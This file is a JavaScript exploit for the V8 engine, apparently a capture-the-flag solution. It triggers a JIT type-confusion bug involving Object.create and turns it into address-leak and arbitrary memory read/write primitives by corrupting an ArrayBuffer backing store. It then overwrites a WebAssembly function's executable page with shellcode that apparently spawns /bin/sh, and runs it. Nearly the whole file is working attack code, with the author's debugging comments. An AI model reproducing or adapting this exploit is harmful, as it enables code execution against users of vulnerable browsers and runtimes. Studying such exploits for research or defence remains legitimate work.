/*function f(o) {
  o.x;
  Object.create(o);
  return o.y.a;
}

f({ x : 0, y : { a : 1 } });
f({ x : 0, y : { a : 2 } });
%OptimizeFunctionOnNextCall(f);
console.log(f({ x : 0, y : { a : 3 } }));//*/
function dp(x){}//{%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
}
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();

const FIELDS_NUM = 0x60;
const BEG_VAL = 1337;
function getObj(val, num)
{
	const obj = {a:1};
	// if `= {}` here,
	// 4 inline cache fields will be reserved
	for (let i = 0; i < num; i++)
	{
		eval("obj.f" + i + "=" + (val + i))
	}
	return obj;
}


let s = "function offsetPair(o)";
s += "{const x = o.a;Object.create(o);";
for (let i = 0; i < FIELDS_NUM; i++)
	s += "const f" + i + "=o.f" + i + ';';
s += "return ["
for (let i = 0; i < FIELDS_NUM; i++)
	s += 'f' + i + ','
s += "];}"
eval(s);


var pos,actual;

get_pair:
for (let i = 0; i < 0x4000; i++)
{
	o = getObj(BEG_VAL, FIELDS_NUM);
	arr = offsetPair(o);
	for (let i = 0; i < arr.length; i++)
	{
		if (arr[i] !== BEG_VAL + i)
		{
			print("[*] vuln triggered!");
			for (let i = 0; i < arr.length; i++)
			{
				if (typeof arr[i] == 'number' &&
					arr[i] >= BEG_VAL &&
					arr[i] < BEG_VAL + FIELDS_NUM &&
					arr[i] - BEG_VAL < i)
					// if arr[i] - BEG_VAL > i
					// CheckMap will always be added later
					// which causes deopt, don't know why
				{
					pos = i;
					actual = arr[i] - BEG_VAL;
				}
			}
			break get_pair;
		}
	}
}
print(pos + ' ' + actual);

s = "function addrOf(o)"
s += "{const x = o.a;"
s += "Object.create(o);"
s += "return o.f" + pos + ".x1;}"

eval(s);
// this does not work
// because if we create object in this way
// `map` object of `o` will not contain information
// about fpos and factual
// therefore when we access o.fpos.a
// there will always be a CheckMap
// for example getObjForAddrOri() creates map A
// for example t1=getObjForAddr() creates map B
// t1[pos] = {x1:4.4,x2:5.5} changes map B to map A
// however by experiment
// there is still some probability
// that the CheckMap of o.fpos.a exists
// when actual > pos
function getObjForAddrOri(val, num, pos, actual)
{
	o = getObj(val, num);
	o["f" + pos] = {x1:1.1, x2:1.2};
	o["f" + actual] = {y1:wmain};
	return o;
}
function getObjForAddr(val, num, pos, actual, victim)
{
	const obj = {a:1};
	// if `= {}` here,
	// 4 inline cache fields will be reserved
	for (let i = 0; i < num; i++)
	{
		if (i == pos)
		{
			eval("obj.f" + pos + "={x1:1.1,x2:1.2}");
			// if we just use {a:1.1} here,
			// HeapNumber instead of unboxed double
			// will be used as the first inline field
			// I _think_ it is because V8 will
			// remember previous {a:xx} map and use them in priority
			// so using a unused map is better
			// {d1:1.1} also works
			/*
			d8> a = {a:(()=>1337)}
			{a: ()=>1337}
			d8> d = {a:1.1}
			{a: 1.1}
			d8> %DebugPrint(d)
			...
			#a: <HeapNumber 1.1> (data field 0)
			...
			*/
		}
		else if (i == actual)
		{
			eval("obj.f" + actual + "={a:victim}");
		}
		else
		{
			eval("obj.f" + i + "=" + (val + i));
		}
	}
	return obj;
}
for (var i = 0; i < 0x4000; i++)
{
	const ret = addrOf(getObjForAddr(BEG_VAL, FIELDS_NUM, pos, actual, wmain));
	if (ret != 1.1)
	{
		print(ret);
		break;
	}

}
o = getObjForAddr(BEG_VAL, FIELDS_NUM, pos, actual, wmain);
wmainAddr = d2u(addrOf(o)) - 1;
print(hex(wmainAddr));



assert(wmainAddr <= 0x7fffffffffff
	|| abAddr <= 0x7fffffffffff, "failed to leak");


s = "function writeBacking(o, val, w)";
s += "{const x = o.a;"
s += "Object.create(o);"
s += "if(w){o.f" + pos + ".x2 = val;}}"
eval(s);

function getObjForRW(val, num, pos, actual, ab)
{
	const obj = {a:1};
	// if `= {}` here,
	// 4 inline cache fields will be reserved
	for (let i = 0; i < num; i++)
	{
		if (i == pos)
		{
			eval("obj.f" + pos + "={x1:1.1,x2:1.2}");
		}
		else if (i == actual)
		{
			eval("obj.f" + actual + "=ab");
		}
		else
		{
			eval("obj.f" + i + "=" + (val + i));
		}
	}
	return obj;
}
ab = new ArrayBuffer(0x137);
o1 = getObjForRW(BEG_VAL, FIELDS_NUM, pos, actual, ab);

for (var i = 0; i < 0x10; i++)
{
	writeBacking(getObjForRW(BEG_VAL, FIELDS_NUM, pos, actual, ab), 1.1, 1);
	writeBacking(getObjForRW(BEG_VAL, FIELDS_NUM, pos, actual, ab), 1.1, 0);
}
for (var i = 0; i < 0x4000; i++)
{
	writeBacking(getObjForRW(BEG_VAL, FIELDS_NUM, pos, actual, ab), 1.1, 0);
}

ab1 = new ArrayBuffer(0x123);
o = getObjForAddr(BEG_VAL, FIELDS_NUM, pos, actual, ab1);
abAddr = d2u(addrOf(o)) - 1;
print(hex(abAddr));
// if we put this at previous position
// address will change and become invalid due to GC

writeBacking(o1, u2d(abAddr + 0x20), 1);
// now ab.backing_store = &ab1.backing_store

const dataView = new DataView(ab);
const dataView1 = new DataView(ab1);
function memRead(addr)
{
	dataView.setFloat64(0, u2d(addr), true);
	// change backing store of ab1
	return d2u(dataView1.getFloat64(0, true));
}

const rwxAddr = memRead(wmainAddr - 0xe0);

print(hex(rwxAddr));

dataView.setFloat64(0, u2d(rwxAddr), true);

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView1.setUint32(i * 4, shellcode[i], true);
}

wmain();

readline();